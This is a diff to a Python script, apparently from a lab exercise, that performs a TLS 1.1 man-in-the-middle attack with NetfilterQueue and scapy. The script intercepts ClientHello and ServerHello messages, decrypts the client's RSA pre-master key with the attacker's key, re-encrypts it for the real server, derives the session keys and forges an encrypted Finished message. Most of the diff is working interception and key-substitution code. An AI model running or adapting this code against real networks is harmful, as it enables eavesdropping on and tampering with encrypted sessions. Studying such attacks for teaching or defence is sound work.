@@ -6,6 +6,7 @@ import socket
 import subprocess
 import http.client
 from operator import truediv
+from pickletools import uint8
 from time import sleep
 import cryptography
 
@@ -15,6 +16,7 @@ import tlslite
 from cryptography.x509 import load_pem_x509_certificate
 from netfilterqueue import NetfilterQueue
 from scapy.layers.inet import IP
+from scapy.layers.tls.crypto.suites import TLS_RSA_WITH_AES_256_CBC_SHA
 from scapy.layers.tls.record import *
 from scapy.layers.tls.handshake import TLSClientHello, TLSServerHello
 from scapy.main import load_layer
@@ -22,12 +24,14 @@ from scapy.packet import Packet
 from scapy.sendrecv import send
 from scapy.utils import hexdump
 from tlslite import X509, X509CertChain, parsePEMKey, HandshakeSettings, SessionCache, Checker
+from tlslite.utils.aes import AES
 from tlslite.utils.compat import bytes_to_int
 
 from cryptography.hazmat.primitives.asymmetric import rsa
 from cryptography.hazmat.primitives import serialization
 from cryptography.hazmat.primitives.asymmetric.padding import PKCS1v15
 from tlslite.utils.cryptomath import SHA1
+from scapy.layers.tls.crypto.prf import _tls_PRF
 
 # We got a server and a client. The server accepts "database" commands from clients: if they are select commands, it accepts
 # them because they are innocuous, but if they are DROP TABLE commands, it requests a certificate from the client before executing them.
@@ -52,7 +56,7 @@ client_finished_concatenation = b'' # we need to save (only the handshake parts,
                                  # client key exchange (changecipherspec is NOT included cause it's not of type of "handshake")
                                  # to later
                                  #  sha256 hash them,
-                                 #  compute PRF of (master_secret, "client finished", hash) to obtain a 12 bytes hash
+                                 #  compute PRF of (computed_master_key, "client finished", hash) to obtain a 12 bytes hash
                                  # append header 0x1400000C
                                  # encrypt the total message "header | hash" using the pre-defined AES 256 CBC block cipher
                                  # send the cyphertext
@@ -64,10 +68,18 @@ server_finished_concatenation = b'' # this one will be the concatenation of the 
 
 from scapy.layers.tls.crypto.prf import PRF
 
-tls_1_1_prf = PRF(tls_version=0x0302)
+tls_1_1_prf = PRF(tls_version=0x0302) # for TLS 1.1, this will select PRF of TLS 1.1 which is a concatenation of KEYED MD5 and SHA1 as described in section 5 of RFC 4346
 client_random = b''
 server_random = b''
-pre_master_secret = b''
+pre_master_key = b''
+computed_master_key = b''
+
+client_write_MAC_secret = b''
+server_write_MAC_secret = b''
+client_write_key = b''
+server_write_key = b''
+client_write_IV = b''
+server_write_IV = b''
 
 def get_handshake_message_bytes(tls_record: Packet):
     # there may be more TLS records stacked after this packet... first isolate it
@@ -158,8 +170,16 @@ def handler_queue_1(pkt: netfilterqueue.Packet):
     global server_finished_concatenation
     global client_random
     global server_random
-    global pre_master_secret
+    global pre_master_key
     global tls_1_1_prf
+    global computed_master_key
+
+    global client_write_MAC_secret
+    global server_write_MAC_secret
+    global client_write_key
+    global server_write_key
+    global client_write_IV
+    global server_write_IV
 
 
     handler_queue_1.pktnum += 1
@@ -192,12 +212,14 @@ def handler_queue_1(pkt: netfilterqueue.Packet):
             print("--------------------------------------------------------------------------------")
 
             tlsmsg : TLSClientHello = (scpy_pkt["TLSClientHello"])
-            #
+
+
             # for the concatenation of the attacker acting as a server to the client, we take it before modifying them
+            print(f"(server concat) client hello length: " + str(len(bytes(tlsmsg))))
             server_finished_concatenation += bytes(tlsmsg)
 
             #random bytes
-            client_random = bytes(tlsmsg.random_bytes)
+            client_random = bytes(tlsmsg)[6:38] # tlsmsg.gmtunixtime is bugged.
             print("client_random: " + client_random.hex()) # to check if it is the same as in the show2() output
 
             #ignore the commented code, it was written as an attempt to try to make the attack work by dropping (not overwriting)
@@ -223,7 +245,7 @@ def handler_queue_1(pkt: netfilterqueue.Packet):
 
 
             pkt.set_payload(bytes(scpy_pkt))
-
+            print(f"(client concat) client hello length: " + str(len(bytes(tlsmsg))))
             # for the concatenation of the attacker acting as a client to the server, we take it after we modified them
             client_finished_concatenation += bytes(tlsmsg)
 
@@ -310,7 +332,7 @@ def handler_queue_1(pkt: netfilterqueue.Packet):
                 elif TLS_record_contains_message_of_type(generic_tls_layer, "TLSServerHello"):
                     #get the random bytes
                     server_hello_msg = generic_tls_layer.getlayer(scapy.layers.tls.handshake.TLSServerHello)
-                    server_random = bytes(server_hello_msg.random_bytes)
+                    server_random = bytes(server_hello_msg)[6:38]
                     print(
                         "server_random: " + server_random.hex())  # to check if it is the same as in the show2() output
 
@@ -371,31 +393,31 @@ def handler_queue_1(pkt: netfilterqueue.Packet):
 
                     # no need to change the msglen, it will be the same when we re-encrypt...
                     # decrypt...
-                    encrypted_pre_master_secret_length__client = bytes(scpy_tls_clientExchg.exchkeys)[0:2]
-                    print("encrypted_pre_master_secret_length: " + str(bytes_to_int(encrypted_pre_master_secret_length__client)))
-                    encrypted_pre_master_secret__client = bytes(scpy_tls_clientExchg.exchkeys)[2:] # remove the first two bytes, they are the pre master length
-                    print(encrypted_pre_master_secret__client)
-                    print("confirm with encrypted_pre_master_secret__client string length: " + str(len(encrypted_pre_master_secret__client)))
+                    encrypted_pre_master_key_length__client = bytes(scpy_tls_clientExchg.exchkeys)[0:2]
+                    print("encrypted_pre_master_key_length: " + str(bytes_to_int(encrypted_pre_master_key_length__client)))
+                    encrypted_pre_master_key__client = bytes(scpy_tls_clientExchg.exchkeys)[2:] # remove the first two bytes, they are the pre master length
+                    print(encrypted_pre_master_key__client)
+                    print("confirm with encrypted_pre_master_key__client string length: " + str(len(encrypted_pre_master_key__client)))
 
                     with open("/app/RSA_key_attacker_server.pem", "rb") as key_file:
                         private_key_attacker_s = serialization.load_pem_private_key(key_file.read(), password=None)
 
-                    pre_master_secret = private_key_attacker_s.decrypt(encrypted_pre_master_secret__client, padding=PKCS1v15())
+                    pre_master_key = private_key_attacker_s.decrypt(encrypted_pre_master_key__client, padding=PKCS1v15())
 
                     print("Plaintext pre master key should be 48 bytes long, 2 for the version, 46 for the random number")
-                    print("length: " + str(len(pre_master_secret)))
-                    print("plaintext: " + str(pre_master_secret))
+                    print("length: " + str(len(pre_master_key)))
+                    print("plaintext: " + str(pre_master_key))
 
                     #reencrypt with the server's public key and send it like that...
                     with open("/app/server_certificate.pem", "rb") as pub_cert_file_server:
                         public_key_server = load_pem_x509_certificate(pub_cert_file_server.read()).public_key()
 
-                    encrypted_pre_master_secret__server = public_key_server.encrypt(pre_master_secret, PKCS1v15())
+                    encrypted_pre_master_key__server = public_key_server.encrypt(pre_master_key, PKCS1v15())
 
                     # substitute the bytes of the pre master secret in the original packet with those here...
-                    scpy_tls_clientExchg.exchkeys = encrypted_pre_master_secret_length__client + encrypted_pre_master_secret__server
+                    scpy_tls_clientExchg.exchkeys = encrypted_pre_master_key_length__client + encrypted_pre_master_key__server
 
-                    print(len(encrypted_pre_master_secret_length__client + encrypted_pre_master_secret__server))
+                    print(len(encrypted_pre_master_key_length__client + encrypted_pre_master_key__server))
                     print("vvvvvvvvvvvvvvvvvvvvvvvv New exchange vvvvvvvvvvvvvvvvvvvvvvvv")
                     print(scpy_pkt.show2())
 
@@ -447,7 +469,87 @@ def handler_queue_1(pkt: netfilterqueue.Packet):
             print(len(server_finished_concatenation))
             print(".....................................")
 
+            #let's calculate the secret and keying material!
+            computed_master_key = tls_1_1_prf.compute_master_secret(pre_master_key, client_random, server_random)
+            print(f"MASTER SECRET (len:{len(computed_master_key)}): " + str(computed_master_key))
 
+            # AES_256_CBC_SHA needs 2x32 bytes keys, 2x20 byte mac secrets and 2x16 byte initialization vectors,
+            # for a total of 136 bytes of material (RFC 4346 sec. 6.3)
+            key_block = _tls_PRF(computed_master_key, "key expansion".encode(), server_random + client_random, 136)
+            client_write_MAC_secret = key_block[0:20]
+            server_write_MAC_secret = key_block[20:40]
+            client_write_key = key_block[40:72]
+            server_write_key = key_block[72:104]
+            client_write_IV = key_block[104:120]
+            server_write_IV = key_block[120:136]
+
+            #now the 12 byte verify field
+            new_verify_field = tls_1_1_prf.compute_verify_data("client", "write", server_finished_concatenation, computed_master_key)
+            print(f"Computed verify... " + str(new_verify_field))
+
+            #we need to append initially the following 4 bytes, 1 for the type, 3 for the length
+            # appendix A.4 and A 4.4 RFC 4346 (FInished message)
+            # first off, we need to create an intermediary plaintext ( this is the same as section 6.2.2, 6.2.1 RFC 4346,
+            # TLSPlaintext and TLSCompressed since compression is off): this is effectively an Handshake message which goes as a
+            # "fragment"
+            temp_pre_encryption = b'\x14\x00\x00\x0C' + new_verify_field # Handshake header and Finished field, handshake type = 0x16 or 20 decimal ("finished" HandshakeType)
+
+            # LET'S ENCRYPT!
+
+            #so, the temp_pre_encryption is a Handshake struct ok? Now... that struct gets put in a TLSPlaintext struct as
+            # the "opaque fragment" field. This TLSPlaintext becomes a TLSCompressed struct (via CompressionMethod.null, which
+            # doesn't change it, effectively fragment of this new TLSCOmpressed is the same as the old one). THis TLSCompressed
+            # becomes a TLSCiphertext struct, which you can see an example (original packet) printed in the screenshot in the app folder...
+            # we printed it via the print(....show2()) function
+
+            #anyways... we need to create the "raw" field that you can see in the screenshot, which is the fragment of the TLSCIphertext,
+            # when case block is chosen... so we follow the construction of GenericBlockCIpher!
+
+            # RECIPE FOR THE MAC!
+            # sequence number at 0 for handshake messages
+            # 1 byte content type at 0x16 for handshake messages
+            # tls version (0x0302 for tls 1.1)
+            # 2 bytes plaintext length (16 for the temp_pre_encryption bytestring)
+            # plaintext (temp_pre_encryption)
+            intermediary_plaintext = b'\x00'*8 + b'\x16' + b'\x03\x02' + b'\x00\x10' + temp_pre_encryption
+
+            from cryptography.hazmat.primitives import hashes, hmac
+
+            h = hmac.HMAC(client_write_MAC_secret, hashes.SHA1())
+            h.update(intermediary_plaintext)
+            signature = h.finalize() # MAC[CipherSpec.hash_size] = MAC[20 BYTES]
+
+            # RECIPE FOR GenericBlockCipher
+            # IV [16 bytes]
+            # content (intermediary_plaintext) [16 bytes]
+            # MAC [20 bytes]
+            # padding (must be a multiple of 16 bytes, the block length of our AES256 cipher, so with 53 as the sum of IV, content and MAC and padding length, we need 11 padding bytes, and the padding bytes will be b'0x0B')
+            # padding length 1
+            from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+
+            cipher = Cipher(algorithms.AES256(client_write_key), modes.CBC(client_write_IV))
+            encryptor = cipher.encryptor()
+            plaintext = client_write_IV + temp_pre_encryption + signature
+
+            padding_length = 16 - (len(plaintext) % 16)
+            if padding_length == 0:
+                padding_length = 16
+            padding = (chr(padding_length - 1) * padding_length).encode()
+
+            plaintext += padding
+
+            print("padded plaintext length: " + str(len(plaintext)))
+
+            ct = encryptor.update(plaintext) + encryptor.finalize()
+
+
+            print(f"Ciphertext: {ct}")
+            print("Ciphertext length: " + str(len(ct)))
+
+            generic_tls_layer.msg = ct
+            print(scpy_pkt.show2())
+
+            exit(0)
 
 
             pkt.set_payload(bytes(scpy_pkt))
@@ -520,6 +622,7 @@ if __name__ == '__main__':
         settings.cipherNames=["aes256gcm", "aes256"]
         settings.maxVersion = TLS_VERSION
         settings.keyExchangeNames = ["rsa", "dhe_rsa"]
+        settings.useEncryptThenMAC = False
 
         try:
             conn.handshakeClientCert(chain,
@@ -577,7 +680,7 @@ if __name__ == '__main__':
         settings.maxVersion = TLS_VERSION
         settings.cipherNames=["aes256gcm", "aes256"]
         settings.keyExchangeNames = ["rsa", "dhe_rsa"]
-
+        settings.useEncryptThenMAC = False
         # session cache active, so we can resume laster
         sessionCache = SessionCache()
 
